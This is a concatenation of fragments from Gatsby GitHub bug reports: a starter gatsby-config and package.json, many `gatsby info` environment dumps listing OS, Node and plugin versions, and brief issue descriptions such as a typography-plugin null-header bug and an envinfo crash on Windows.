this barebones starter ships with the main gatsby configuration files you might need.`, author: `@gatsbyjs`, }, plugins: [ `gatsby-plugin-react-helmet`, { resolve: `gatsby-source-filesystem`, options: { name: `images`, path: `${__dirname}/src/images`, }, }, `gatsby-transformer-sharp`, `gatsby-plugin-sharp`, { resolve: `gatsby-plugin-manifest`, options: { name: `gatsby-starter-default`, short_name: `starter`, start_url: `/`, background_color: `#663399`, theme_color: `#663399`, display: `minimal-ui`, icon: `src/images/gatsby-icon.png`, // this path is relative to the root of the site
}, }, { resolve: `gatsby-plugin-typography`, options: { pathtoconfigmodule: `src/utils/typography`, }, }, // this (optional) plugin enables progressive web app + offline functionality // to learn more, visit: // 'gatsby-plugin-offline', ],
``` contents of `package.json`:
```javascript
{ "name": "gatsby-starter-default", "private": true, "description": "a simple starter to get up and developing quickly with gatsby", "version": "0.1.0", "author": "kyle mathews <mathews.kyle@gmail.com>", "dependencies": { "gatsby": "^2.2.5", "gatsby-image": "^2.0.34", "gatsby-plugin-manifest": "^2.0.24", "gatsby-plugin-offline": "^2.0.25", "gatsby-plugin-react-helmet": "^3.0.10", "gatsby-plugin-sharp": "^2.0.30", "gatsby-plugin-typography": "^2.2.10", "gatsby-source-filesystem": "^2.0.27", "gatsby-transformer-sharp": "^2.1.17", "prop-types": "^15.7.2", "react": "^16.8.4", "react-dom": "^16.8.4", "react-helmet": "^5.2.0", "react-typography": "^0.16.19", "typography": "^0.16.19", "typography-theme-fairy-gates": "^0.16.19" }, "devdependencies": { "prettier": "^1.16.4" }, "keywords": [ "gatsby" ], "license": "mit", "scripts": { "build": "gatsby build", "develop": "gatsby develop", "format": "prettier --write src/**/*.{js,jsx}", "start": "npm run develop", "serve": "gatsby serve", "test": "echo \\"write tests! -> "" }, "repository": { "type": "git", "url": " " }, "bugs": { "url": " " }
``` output of `gatsby info --clipboard` : system: os: windows 10 cpu: (8) x64 intel(r) core(tm) i7-6700hq cpu @ 2.60ghz binaries: yarn: 1.7.0 - c:\\program files (x86)\\yarn\\bin\\yarn.cmd npm: 6.2.0 - c:\\program files\ odejs\ pm.cmd languages: python: 2.7.15 browsers: edge: 44.17763.1.0 npmpackages: gatsby: ^2.2.5 => 2.2.5 gatsby-image: ^2.0.34 => 2.0.34 gatsby-plugin-manifest: ^2.0.24 => 2.0.24 gatsby-plugin-offline: ^2.0.25 => 2.0.25 gatsby-plugin-react-helmet: ^3.0.10 => 3.0.10 gatsby-plugin-sharp: ^2.0.30 => 2.0.30 gatsby-plugin-typography: ^2.2.10 => 2.2.10 gatsby-source-filesystem: ^2.0.27 => 2.0.27 gatsby-transformer-sharp: ^2.1.17 => 2.1.17 error unhandled rejection error: the system cannot find the path specified
- envinfo.js:1 function.e.exports.sync [npm]/[gatsby-cli]/[envinfo]/dist/envinfo.js:1:4970 - envinfo.js:1 object.copysync [npm]/[gatsby-cli]/[envinfo]/dist/envinfo.js:1:66948 - envinfo.js:1 object.t.writesync.e [as writesync] [npm]/[gatsby-cli]/[envinfo]/dist/envinfo.js:1:48777 - envinfo.js:1 [npm]/[gatsby-cli]/[envinfo]/dist/envinfo.js:1:46934 - envinfo.js:1 promise.all.then.e [npm]/[gatsby-cli]/[envinfo]/dist/envinfo.js:1:46949 contents of `gatsby-ssr.js`, `gatsby-node.js` and `gatsby-browser.js` are the same as in the [gatsby-starter-default]( (i.e
``` system: os: macos high sierra 10.13.6 cpu: (8) x64 intel(r) core(tm) i7-4770hq cpu @ 2.20ghz shell: 3.2.57 - /bin/bash binaries: node: 11.6.0 - /var/folders/qv/2cfwn7m13jb4rpxhm9trf1yczc9jvk/t/yarn--1553291763090-0.49216429764230507/node yarn: 1.13.0 - /var/folders/qv/2cfwn7m13jb4rpxhm9trf1yczc9jvk/t/yarn--1553291763090-0.49216429764230507/yarn npm: 6.5.0-next.0 - ~/.nvm/versions/node/v11.6.0/bin/npm languages: python: 2.7.15 - /usr/local/bin/python browsers: chrome: 73.0.3683.86 firefox: 55.0.3 safari: 11.1.2 npmpackages: gatsby: ^2.2.0 => 2.2.0 gatsby-image: ^2.0.0-rc.1 => 2.0.34 gatsby-link: ^2.0.0-rc.2 => 2.0.16 gatsby-plugin-canonical-urls: ^2.0.0-rc.1 => 2.0.12 gatsby-plugin-emotion: ^4.0.1 => 4.0.6 gatsby-plugin-esca-css: ^1.0.3 => 1.0.3 gatsby-plugin-favicon: ^3.1.4 => 3.1.5 gatsby-plugin-feed: ^2.0.8 => 2.0.15 gatsby-plugin-google-analytics: ^2.0.0-rc.1 => 2.0.17 gatsby-plugin-google-fonts: ^0.0.4 => 0.0.4 gatsby-plugin-netlify: ^2.0.0-rc.2 => 2.0.13 gatsby-plugin-netlify-cms: ^3.0.0-rc.1 => 3.0.16 gatsby-plugin-netlify-cms-paths: ^1.0.1 => 1.2.1 gatsby-plugin-polyfill-io: ^1.0.5 => 1.1.0 gatsby-plugin-prefetch-google-fonts: ^1.2.0 => 1.4.0 gatsby-plugin-react-helmet: ^3.0.10 => 3.0.10 gatsby-plugin-remove-trailing-slashes: ^2.0.0-rc.1 => 2.0.10 gatsby-plugin-robots-txt: ^1.3.0 => 1.4.0 gatsby-plugin-sharp: ^2.0.0-rc.3 => 2.0.29 gatsby-plugin-sitemap: ^2.0.10 => 2.0.10 gatsby-plugin-webpack-size: ^0.0.3 => 0.0.3 gatsby-remark-copy-linked-files: ^2.0.0-rc.1 => 2.0.11 gatsby-remark-external-links: ^0.0.4 => 0.0.4 gatsby-remark-images: ^3.0.1 => 3.0.10 gatsby-remark-smartypants: ^2.0.0-rc.1 => 2.0.9 gatsby-source-filesystem: ^2.0.1-rc.1 => 2.0.27 gatsby-transformer-remark: ^2.3.6 => 2.3.6 gatsby-transformer-sharp: ^2.1.1-rc.2 => 2.1.17 ```
``` system: os: macos 10.14.3 cpu: (8) x64 intel(r) core(tm) i7-4870hq cpu @ 2.50ghz shell: 5.3 - /bin/zsh binaries: node: 10.13.0 - ~/.nvm/versions/node/v10.13.0/bin/node yarn: 1.12.3 - /usr/local/bin/yarn npm: 6.4.1 - ~/.nvm/versions/node/v10.13.0/bin/npm languages: python: 2.7.15 - /users/myer/.pyenv/shims/python browsers: chrome: 72.0.3626.121 safari: 12.0.3 npmpackages: gatsby: ^2.0.107 => 2.1.35 gatsby-image: ^2.0.22 => 2.0.34 gatsby-plugin-react-helmet: ^3.0.0 => 3.0.9 gatsby-plugin-sharp: ^2.0.6 => 2.0.29 gatsby-plugin-typography: ^2.2.0 => 2.2.10 gatsby-remark-responsive-iframe: ^2.0.5 => 2.1.1 gatsby-source-filesystem: ^2.0.2 => 2.0.27 gatsby-transformer-remark: ^2.1.6 => 2.3.4 gatsby-transformer-sharp: ^2.1.3 => 2.1.17 gatsby-transformer-yaml: ^2.1.6 => 2.1.10 ```
system: os: macos high sierra 10.13.6 cpu: (12) x64 intel(r) core(tm) i7-8850h cpu @ 2.60ghz shell: 3.2.57 - /bin/bash binaries: node: 11.9.0 - /usr/local/bin/node yarn: 1.13.0 - /usr/local/bin/yarn npm: 6.5.0 - /usr/local/bin/npm languages: python: 2.7.10 - /usr/bin/python browsers: chrome: 73.0.3683.75 firefox: 60.0.2 safari: 12.0.3 npmpackages: gatsby: ^2.1.31 => 2.1.31 gatsby-image: ^2.0.33 => 2.0.33 gatsby-plugin-manifest: ^2.0.24 => 2.0.24 gatsby-plugin-offline: ^2.0.25 => 2.0.25 gatsby-plugin-react-helmet: ^3.0.9 => 3.0.9 gatsby-plugin-sharp: ^2.0.28 => 2.0.28 gatsby-source-filesystem: ^2.0.24 => 2.0.24 gatsby-transformer-sharp: ^2.1.17 => 2.1.17 npmglobalpackages: gatsby: 2.0.116
system: os: macos 10.14.2 cpu: (8) x64 intel(r) core(tm) i7-6820hq cpu @ 2.70ghz shell: 5.3 - /bin/zsh binaries: node: 11.10.1 - ~/.nvm/versions/node/v11.10.1/bin/node yarn: 1.13.0 - /usr/local/bin/yarn npm: 6.9.0 - ~/.nvm/versions/node/v11.10.1/bin/npm languages: python: 2.7.10 - /usr/bin/python browsers: chrome: 72.0.3626.121 firefox: 64.0.2 safari: 12.0.2 npmpackages: gatsby: ^2.0.106 => 2.0.106 gatsby-image: ^2.0.29 => 2.0.29 gatsby-plugin-layout: ^1.0.12 => 1.0.12 gatsby-plugin-manifest: ^2.0.15 => 2.0.15 gatsby-plugin-offline: ^2.0.22 => 2.0.22 gatsby-plugin-react-helmet: ^3.0.2 => 3.0.5 gatsby-plugin-sharp: ^2.0.19 => 2.0.19 gatsby-plugin-styled-components: ^3.0.4 => 3.0.4 gatsby-source-filesystem: ^2.0.18 => 2.0.18 gatsby-source-shopify: ^2.0.11 => 2.0.11 gatsby-transformer-sharp: ^2.1.13 => 2.1.13 npmglobalpackages: gatsby-cli: 2.4.13
```txt system: os: macos 10.14.4 cpu: (8) x64 intel(r) core(tm) i7-7820hq cpu @ 2.90ghz shell: 5.3 - /bin/zsh binaries: node: 11.10.0 - /var/folders/r5/9r6yq3695tqgy0z3bswzxn8h0000gn/t/yarn--1552498926309-0.6699258377655932/node yarn: 1.13.0 - /var/folders/r5/9r6yq3695tqgy0z3bswzxn8h0000gn/t/yarn--1552498926309-0.6699258377655932/yarn npm: 5.7.1 - /usr/local/bin/npm languages: python: 2.7.10 - /usr/bin/python browsers: chrome: 72.0.3626.121 firefox: 61.0.2 safari: 12.1 npmpackages: gatsby: 2.1.31 => 2.1.31 gatsby-plugin-catch-links: 2.0.13 => 2.0.13 gatsby-plugin-feed: 2.0.15 => 2.0.15 gatsby-plugin-google-analytics: 2.0.17 => 2.0.17 gatsby-plugin-manifest: 2.0.24 => 2.0.24 gatsby-plugin-netlify: 2.0.12 => 2.0.12 gatsby-plugin-nprogress: 2.0.10 => 2.0.10 gatsby-plugin-offline: 2.0.25 => 2.0.25 gatsby-plugin-react-helmet: 3.0.9 => 3.0.9 gatsby-plugin-sharp: ^2.0.28 => 2.0.28 gatsby-plugin-sitemap: 2.0.9 => 2.0.9 gatsby-plugin-styletron: 3.0.5 => 3.0.5 gatsby-plugin-typography: 2.2.9 => 2.2.9 gatsby-remark-autolink-headers: 2.0.16 => 2.0.16 gatsby-remark-copy-linked-files: 2.0.10 => 2.0.10 gatsby-remark-emoji: 0.0.2 => 0.0.2 gatsby-remark-images: 3.0.9 => 3.0.9 gatsby-remark-prismjs: 3.2.5 => 3.2.5 gatsby-remark-responsive-iframe: 2.0.10 => 2.0.10 gatsby-remark-smartypants: 2.0.9 => 2.0.9 gatsby-source-filesystem: 2.0.24 => 2.0.24 gatsby-transformer-remark: 2.3.2 => 2.3.2 ``` ## summary when headers contain `null` `gatsby-plugin-typography` fails to process headers when moving typography related header components to the top
i can create a pr with a simple null check fix if that's ok, unless this is the correct behaviour.
``` system: os: macos 10.14 cpu: (4) x64 intel(r) core(tm) i5-5257u cpu @ 2.70ghz shell: 5.5.1 - /usr/local/bin/zsh binaries: node: 10.5.0 - /usr/local/bin/node yarn: 1.12.3 - /usr/local/bin/yarn npm: 6.4.1 - /usr/local/bin/npm browsers: chrome: 72.0.3626.121 firefox: 65.0.1 safari: 12.0 npmpackages: gatsby: ^2.0.53 => 2.0.67 gatsby-plugin-offline: ^2.0.19 => 2.0.19 gatsby-plugin-react-helmet: ^3.0.2 => 3.0.4 gatsby-plugin-s3: ^0.2.4 => 0.2.4 gatsby-plugin-sitemap: ^2.0.3 => 2.0.3 gatsby-plugin-styled-components: ^3.0.4 => 3.0.4 gatsby-plugin-typescript: ^2.0.3 => 2.0.3 gatsby-source-filesystem: ^2.0.12 => 2.0.12 gatsby-source-graphql: ^2.0.7 => 2.0.7 npmglobalpackages: gatsby-cli: 2.4.6 gatsby-plugin-graphql-preview: 0.0.0-development gatsby-plugin-s3: 0.2.5 gatsby-starter-default: 1.0.0
$ /sandbox/node_modules/.bin/gatsby info system: os: linux 4.17 debian gnu/linux 9 (stretch) 9 (stretch) cpu: (8) x64 intel xeon processor (skylake, ibrs) shell: 4.4.12 - /bin/bash binaries: node: 8.14.0 - /tmp/yarn--1552315817668-0.739238521021055/node yarn: 1.12.3 - /tmp/yarn--1552315817668-0.739238521021055/yarn npm: 6.4.1 - /usr/local/bin/npm languages: python: 2.7.13 - /usr/bin/python npmpackages: gatsby: ^2.1.29 => 2.1.29 gatsby-image: ^2.0.31 => 2.0.31 gatsby-plugin-flow: 1.0.3 => 1.0.3 gatsby-plugin-manifest: ^2.0.22 => 2.0.22 gatsby-plugin-offline: ^2.0.24 => 2.0.24 gatsby-plugin-react-helmet: ^3.0.8 => 3.0.8 gatsby-plugin-sharp: ^2.0.26 => 2.0.26 gatsby-source-filesystem: ^2.0.23 => 2.0.23 gatsby-transformer-sharp: ^2.1.15 => 2.1.15 done in 1.57s.
system: os: windows 7 cpu: (2) ia32 amd athlon(tm) ii x2 240 processor binaries: npm: 6.4.1 - c:\\program files\ odejs\ pm.cmd npmpackages: gatsby: ^2.1.28 => 2.1.28 gatsby-source-filesystem: ^2.0.23 => 2.0.23
`gatsby info --clipboard` threw an error when i tried to run it, but here's what it spit out: ``` system: os: windows 10 cpu: (8) x64 intel(r) core(tm) i7-7700hq cpu @ 2.80ghz binaries: npm: 6.4.1 - c:\\program files\ odejs\ pm.cmd browsers: edge: 44.17763.1.0 npmpackages: gatsby: ^2.1.24 => 2.1.24 gatsby-image: ^2.0.31 => 2.0.31 gatsby-plugin-feed: ^2.0.14 => 2.0.14 gatsby-plugin-google-analytics: ^2.0.16 => 2.0.16 gatsby-plugin-manifest: ^2.0.22 => 2.0.22 gatsby-plugin-offline: ^2.0.24 => 2.0.24 gatsby-plugin-react-helmet: ^3.0.8 => 3.0.8 gatsby-plugin-sharp: ^2.0.25 => 2.0.25 gatsby-plugin-typography: ^2.2.8 => 2.2.8 gatsby-remark-copy-linked-files: ^2.0.9 => 2.0.9 gatsby-remark-images: ^2.0.6 => 2.0.6 gatsby-remark-prismjs: ^3.2.4 => 3.2.4 gatsby-remark-responsive-iframe: ^2.0.9 => 2.0.9 gatsby-remark-smartypants: ^2.0.8 => 2.0.8 gatsby-source-filesystem: ^2.0.23 => 2.0.23 gatsby-transformer-remark: ^2.3.1 => 2.3.1 gatsby-transformer-sharp: ^2.1.15 => 2.1.15 ```
``` system: os: macos 10.14.3 cpu: (8) x64 intel(r) core(tm) i7-4870hq cpu @ 2.50ghz shell: 5.7.1 - /usr/local/bin/zsh binaries: node: 11.10.1 - /var/folders/sb/bms_668s56dcm__8z_zp799w0000gn/t/yarn--1551995935354-0.48590971035339536/node yarn: 1.13.0 - /var/folders/sb/bms_668s56dcm__8z_zp799w0000gn/t/yarn--1551995935354-0.48590971035339536/yarn npm: 6.7.0 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/local/bin/python browsers: chrome: 72.0.3626.121 safari: 12.0.3 npmpackages: gatsby: 2.1.24 => 2.1.24 gatsby-cli: 2.4.13 => 2.4.13 gatsby-pagination: 1.2.0 => 1.2.0 gatsby-plugin-catch-links: 2.0.12 => 2.0.12 gatsby-plugin-emotion: ^4.0.4 => 4.0.4 gatsby-plugin-favicon: ^3.1.5 => 3.1.5 gatsby-plugin-flow: 1.0.2 => 1.0.2 gatsby-plugin-google-analytics: 2.0.16 => 2.0.16 gatsby-plugin-react-helmet: 3.0.8 => 3.0.8 gatsby-plugin-remove-serviceworker: ^1.0.0 => 1.0.0 gatsby-plugin-sharp: 2.0.25 => 2.0.25 gatsby-plugin-sitemap: 2.0.6 => 2.0.6 gatsby-plugin-svgr: 2.0.1 => 2.0.1 gatsby-plugin-typography: 2.2.8 => 2.2.8 gatsby-remark-abbr: 1.0.0 => 1.0.0 gatsby-remark-autolink-headers: 2.0.15 => 2.0.15 gatsby-remark-copy-linked-files: 2.0.9 => 2.0.9 gatsby-remark-embed-snippet: 3.2.2 => 3.2.2 gatsby-remark-emoji: 0.0.2 => 0.0.2 gatsby-remark-images: 3.0.6 => 3.0.6 gatsby-remark-prismjs: 3.2.4 => 3.2.4 gatsby-remark-responsive-iframe: 2.0.9 => 2.0.9 gatsby-remark-smartypants: 2.0.8 => 2.0.8 gatsby-remark-source-name: ^1.0.0 => 1.0.0 gatsby-source-filesystem: 2.0.23 => 2.0.23 gatsby-transformer-remark: 2.3.1 => 2.3.1 gatsby-transformer-sharp: 2.1.15 => 2.1.15 gatsby-transformer-yaml: 2.1.8 => 2.1.8 ```
system: os: macos 10.14.2 cpu: x64 intel(r) core(tm) i5-5287u cpu @ 2.90ghz shell: 5.3 - /bin/zsh binaries: node: 8.12.0 - ~/.nvm/versions/node/v8.12.0/bin/node yarn: 1.12.3 - /usr/local/bin/yarn npm: 6.4.1 - ~/.nvm/versions/node/v8.12.0/bin/npm browsers: chrome: 72.0.3626.119 firefox: 64.0 safari: 12.0.2 npmpackages: gatsby: ^2.0.0 => 2.0.21 gatsby-plugin-catch-links: ^2.0.0 => 2.0.4 gatsby-plugin-feed: ^2.0.0 => 2.0.8 gatsby-plugin-glamor: ^2.0.0 => 2.0.5 gatsby-plugin-google-analytics: ^2.0.0 => 2.0.6 gatsby-plugin-manifest: ^2.0.0 => 2.0.5 gatsby-plugin-netlify: ^2.0.0 => 2.0.1 gatsby-plugin-nprogress: ^2.0.0 => 2.0.5 gatsby-plugin-react-helmet: ^3.0.0 => 3.0.0 gatsby-plugin-sharp: ^2.0.0 => 2.0.6 gatsby-plugin-twitter: ^2.0.0 => 2.0.6 gatsby-remark-code-repls: ^2.0.0 => 2.0.0 gatsby-remark-copy-linked-files: ^2.0.0 => 2.0.5 gatsby-remark-embed-snippet: ^3.0.0 => 3.0.0 gatsby-remark-images: ^2.0.0 => 2.0.4 gatsby-remark-prismjs: ^3.0.2 => 3.0.2 gatsby-remark-responsive-iframe: ^2.0.0 => 2.0.5 gatsby-remark-smartypants: ^2.0.0 => 2.0.5 gatsby-source-filesystem: ^2.0.0 => 2.0.3 gatsby-transformer-remark: ^2.0.0 => 2.1.7 gatsby-transformer-sharp: ^2.0.0 => 2.1.3
the same result on chrome and firefox (kubuntu).
run `npx gatsby build` and `npx gatsby serve`, or deploy the project in your project directory and paste the output here.
(if relevant) system: os: macos 10.14.2 cpu: (12) x64 intel(r) core(tm) i7-8850h cpu @ 2.60ghz shell: 3.2.57 - /bin/bash binaries: node: 10.15.0 - ~/.nvm/versions/node/v10.15.0/bin/node yarn: 1.13.0 - /usr/local/bin/yarn npm: 6.4.1 - ~/.nvm/versions/node/v10.15.0/bin/npm npmpackages: gatsby: ^2.1.19 => 2.1.19 gatsby-image: ^2.0.30 => 2.0.30 gatsby-plugin-emotion: ^4.0.4 => 4.0.4 gatsby-plugin-eslint: ^2.0.4 => 2.0.4 gatsby-plugin-manifest: ^2.0.20 => 2.0.20 gatsby-plugin-offline: ^2.0.24 => 2.0.24 gatsby-plugin-react-helmet: ^3.0.7 => 3.0.7 gatsby-plugin-sharp: ^2.0.23 => 2.0.23 gatsby-source-filesystem: ^2.0.23 => 2.0.23 gatsby-transformer-sharp: ^2.1.15 => 2.1.15 npmglobalpackages: gatsby-cli: 2.4.8
``` system: os: macos 10.14.2 cpu: (12) x64 intel(r) core(tm) i9-8950hk cpu @ 2.90ghz shell: 3.2.57 - /bin/bash binaries: node: 10.13.0 - ~/.nvm/versions/node/v10.13.0/bin/node yarn: 1.12.3 - ~/.nvm/versions/node/v10.13.0/bin/yarn npm: 6.4.1 - ~/.nvm/versions/node/v10.13.0/bin/npm languages: python: 2.7.15 - /usr/local/bin/python browsers: chrome: 72.0.3626.119 firefox: 65.0.1 safari: 12.0.2 npmpackages: gatsby: ^2.0.85 => 2.1.17 gatsby-image: ^2.0.30 => 2.0.30 gatsby-plugin-canonical-urls: ^2.0.5 => 2.0.10 gatsby-plugin-feed: ^2.0.13 => 2.0.13 gatsby-plugin-google-analytics: ^2.0.14 => 2.0.14 gatsby-plugin-manifest: ^2.0.19 => 2.0.19 gatsby-plugin-react-helmet: ^3.0.0 => 3.0.6 gatsby-plugin-sharp: ^2.0.5 => 2.0.22 gatsby-plugin-styled-components: ^3.0.5 => 3.0.6 gatsby-plugin-typescript: ^2.0.0 => 2.0.9 gatsby-remark-autolink-headers: ^2.0.14 => 2.0.14 gatsby-remark-copy-linked-files: ^2.0.5 => 2.0.9 gatsby-remark-images: ^2.0.1 => 2.0.6 gatsby-remark-prismjs: ^3.0.0 => 3.2.4 gatsby-remark-responsive-iframe: ^2.0.5 => 2.0.9 gatsby-remark-smartypants: ^2.0.5 => 2.0.8 gatsby-source-filesystem: ^2.0.1 => 2.0.22 gatsby-transformer-json: ^2.1.1 => 2.1.8 gatsby-transformer-remark: ^2.1.3 => 2.2.6 gatsby-transformer-sharp: ^2.1.1 => 2.1.14 npmglobalpackages: gatsby: 2.1.4
system: os: macos 10.14.3 cpu: (8) x64 intel(r) core(tm) i7-6920hq cpu @ 2.90ghz shell: 3.2.57 - /bin/bash binaries: node: 10.12.0 - ~/.nvm/versions/node/v10.12.0/bin/node yarn: 1.13.0 - /usr/local/bin/yarn npm: 6.8.0 - ~/development/tlc-website/plugins/gatsby-source-tocco/node_modules/.bin/npm languages: python: 2.7.10 - /usr/bin/python browsers: chrome: 72.0.3626.119 firefox: 65.0.1 safari: 12.0.3 npmpackages: gatsby-node-helpers: ^0.3.0 => 0.3.0 gatsby-source-filesystem: 2.0.23 => 2.0.23 npmglobalpackages: gatsby-cli: 2.4.12
``` system: os: macos 10.14.3 cpu: (4) x64 intel(r) core(tm) i5-4250u cpu @ 1.30ghz shell: 3.2.57 - /bin/bash binaries: node: 11.5.0 - ~/.nvm/versions/node/v11.5.0/bin/node yarn: 1.12.3 - /usr/local/bin/yarn npm: 6.7.0 - ~/.nvm/versions/node/v11.5.0/bin/npm languages: python: 3.6.4 - /usr/local/bin/python browsers: firefox: 65.0.1 safari: 12.0.3 npmpackages: gatsby: ^2.1.18 => 2.1.18 gatsby-image: ^2.0.20 => 2.0.25 gatsby-plugin-favicon: ^3.1.5 => 3.1.5 gatsby-plugin-manifest: ^2.0.9 => 2.0.12 gatsby-plugin-offline: ^2.0.24 => 2.0.24 gatsby-plugin-react-helmet: ^3.0.7 => 3.0.7 gatsby-plugin-sharp: ^2.0.22 => 2.0.22 gatsby-plugin-styled-components: ^3.0.6 => 3.0.6 gatsby-source-filesystem: ^2.0.23 => 2.0.23 gatsby-transformer-remark: ^2.2.0 => 2.2.0 gatsby-transformer-sharp: ^2.1.14 => 2.1.14 npmglobalpackages: gatsby-cli: 2.4.8
``` ### additional infomation
same issue occurred deploying with netlify as well, so it should not be a zeit now issue.
``` system: os: macos 10.14.3 cpu: (4) x64 intel(r) core(tm) i5-4250u cpu @ 1.30ghz shell: 3.2.57 - /bin/bash binaries: node: 11.5.0 - ~/.nvm/versions/node/v11.5.0/bin/node yarn: 1.12.3 - /usr/local/bin/yarn npm: 6.7.0 - ~/.nvm/versions/node/v11.5.0/bin/npm languages: python: 3.6.4 - /usr/local/bin/python browsers: firefox: 65.0.1 safari: 12.0.3 npmpackages: gatsby: ^2.1.18 => 2.1.18 gatsby-image: ^2.0.20 => 2.0.25 gatsby-plugin-favicon: ^3.1.5 => 3.1.5 gatsby-plugin-manifest: ^2.0.9 => 2.0.12 gatsby-plugin-offline: ^2.0.24 => 2.0.24 gatsby-plugin-react-helmet: ^3.0.7 => 3.0.7 gatsby-plugin-sharp: ^2.0.22 => 2.0.22 gatsby-plugin-styled-components: ^3.0.6 => 3.0.6 gatsby-source-filesystem: ^2.0.23 => 2.0.23 gatsby-transformer-remark: ^2.2.0 => 2.2.0 gatsby-transformer-sharp: ^2.1.14 => 2.1.14 npmglobalpackages: gatsby-cli: 2.4.8
``` ### additional information this started to happen since gatsby 2.1.10, related to #11831
i have already tried fixing the react hot load warning but the error persisted
thank you very much for your help.
run `npx gatsby info --clipboard` in your project directory and paste the output here.
system: os: windows 10 cpu: (4) x64 intel(r) core(tm) i5-7200u cpu @ 2.50ghz binaries: yarn: 1.12.3 - c:\\program files (x86)\\yarn\\bin\\yarn.cmd npm: 6.4.1 - c:\\program files\ odejs\ pm.cmd browsers: edge: 42.17134.1.0 npmpackages: gatsby: ^2.1.18 => 2.1.18 gatsby-plugin-create-client-paths: ^2.0.4 => 2.0.4 gatsby-plugin-react-helmet: ^3.0.6 => 3.0.7 gatsby-plugin-typescript: ^2.0.7 => 2.0.9
``` system: os: macos 10.14.3 cpu: (4) x64 intel(r) core(tm) i5-7360u cpu @ 2.30ghz shell: 3.2.57 - /bin/bash binaries: node: 11.10.0 - /usr/local/bin/node yarn: 1.13.0 - /usr/local/bin/yarn npm: 6.7.0 - /usr/local/bin/npm languages: python: 2.7.13 - /usr/local/bin/python browsers: chrome: 72.0.3626.109 firefox: 65.0.1 safari: 12.0.3 npmpackages: gatsby: ^2.1.17 => 2.1.17 gatsby-image: ^2.0.29 => 2.0.29 gatsby-plugin-manifest: ^2.0.19 => 2.0.19 gatsby-plugin-offline: ^2.0.24 => 2.0.24 gatsby-plugin-react-helmet: ^3.0.6 => 3.0.6 gatsby-plugin-sharp: ^2.0.22 => 2.0.22 gatsby-source-filesystem: ^2.0.22 => 2.0.22 gatsby-transformer-sharp: ^2.1.14 => 2.1.14
run `gatsby develop` and observe the error in chrome.
system: os: macos 10.14.3 cpu: (8) x64 intel(r) core(tm) i5-8259u cpu @ 2.30ghz shell: 3.2.57 - /bin/bash binaries: node: 10.15.0 - /usr/local/bin/node npm: 6.4.1 - /usr/local/bin/npm languages: python: 2.7.10 - /usr/bin/python browsers: chrome: 72.0.3626.109 firefox: 65.0.1 safari: 12.0.3 npmpackages: gatsby: ^2.0.0 => 2.0.97 gatsby-image: ^2.0.5 => 2.0.27 gatsby-plugin-glamor: ^2.0.5 => 2.0.7 gatsby-plugin-google-analytics: ^2.0.5 => 2.0.10 gatsby-plugin-manifest: ^2.0.2 => 2.0.13 gatsby-plugin-offline: ^2.0.5 => 2.0.21 gatsby-plugin-sharp: ^2.0.5 => 2.0.18 gatsby-plugin-typography: ^2.2.0 => 2.2.5 gatsby-source-filesystem: ^2.0.1 => 2.0.17 gatsby-transformer-json: ^2.1.1 => 2.1.7 gatsby-transformer-sharp: ^2.1.1 => 2.1.12 npmglobalpackages: gatsby-cli: 2.4.8
system: os: linux 4.15 linux mint 18.3 (sylvia) cpu: (8) x64 intel(r) core(tm) i5-8250u cpu @ 1.60ghz shell: 4.3.48 - /bin/bash binaries: node: 8.11.4 - /usr/bin/node yarn: 1.13.0 - /usr/bin/yarn npm: 6.4.1 - /usr/bin/npm languages: python: 2.7.12 - /usr/bin/python browsers: chrome: 72.0.3626.119 firefox: 65.0.1 npmpackages: gatsby: ^2.1.17 => 2.1.17 gatsby-image: ^2.0.29 => 2.0.29 gatsby-plugin-manifest: ^2.0.19 => 2.0.19 gatsby-plugin-offline: ^2.0.24 => 2.0.24 gatsby-plugin-react-helmet: ^3.0.6 => 3.0.6 gatsby-plugin-sharp: ^2.0.22 => 2.0.22 gatsby-remark-autolink-headers: ^2.0.14 => 2.0.14 gatsby-source-filesystem: ^2.0.22 => 2.0.22 gatsby-transformer-remark: ^2.2.6 => 2.2.6 gatsby-transformer-sharp: ^2.1.14 => 2.1.14 npmglobalpackages: gatsby-cli: 2.4.4
run `npm start dev` or `gatsby build gatsby serve` same results
``` system: os: macos 10.14.3 cpu: (8) x64 intel(r) core(tm) i7-7820hq cpu @ 2.90ghz shell: 3.2.57 - /bin/bash binaries: node: 10.14.2 - ~/.nvm/versions/node/v10.14.2/bin/node yarn: 1.13.0 - /usr/local/bin/yarn npm: 6.4.1 - ~/.nvm/versions/node/v10.14.2/bin/npm languages: python: 2.7.15 - /usr/local/bin/python browsers: chrome: 72.0.3626.109 firefox: 63.0 safari: 12.0.3
system: os: windows 10 cpu: (12) x64 amd ryzen 5 1600 six-core processor binaries: npm: 6.7.0 - c:\\program files\ odejs\ pm.cmd languages: python: 3.7.2 - c:\\users\\caven\\appdata\\local\\programs\\python\\python37-32\\python.exe browsers: edge: 42.17134.1.0 npmpackages: gatsby: ^2.1.9 => 2.1.9 gatsby-plugin-catch-links: ^2.0.11 => 2.0.11 gatsby-plugin-emotion: ^4.0.3 => 4.0.3 gatsby-plugin-react-helmet: ^3.0.6 => 3.0.6 gatsby-source-filesystem: ^2.0.20 => 2.0.20 gatsby-transformer-remark: ^2.2.5 => 2.2.5 (`npx gatsby info --clipboard` crashes at that point for me, not sure what's happening there..
let me know if you need more info!)
``` system: os: macos 10.14.3 cpu: (8) x64 intel(r) core(tm) i7-6700hq cpu @ 2.60ghz shell: 5.3 - /bin/zsh binaries: node: 8.12.0 - ~/.nvm/versions/node/v8.12.0/bin/node yarn: 1.10.1 - /usr/local/bin/yarn npm: 6.4.1 - ~/.nvm/versions/node/v8.12.0/bin/npm languages: python: 2.7.10 - /usr/bin/python browsers: chrome: 72.0.3626.109 firefox: 65.0.1 safari: 12.0.3 npmpackages: gatsby: ^2.1.4 => 2.1.4 gatsby-plugin-emotion: ^2.0.5 => 2.0.5 gatsby-plugin-google-tagmanager: ^2.0.5 => 2.0.5 gatsby-plugin-manifest: ^2.0.2 => 2.0.2 gatsby-plugin-offline: ^2.0.5 => 2.0.5 gatsby-plugin-react-helmet: ^3.0.0 => 3.0.0 gatsby-plugin-sitemap: ^2.0.1 => 2.0.1 gatsby-source-contentful: ^2.0.29 => 2.0.29 ```
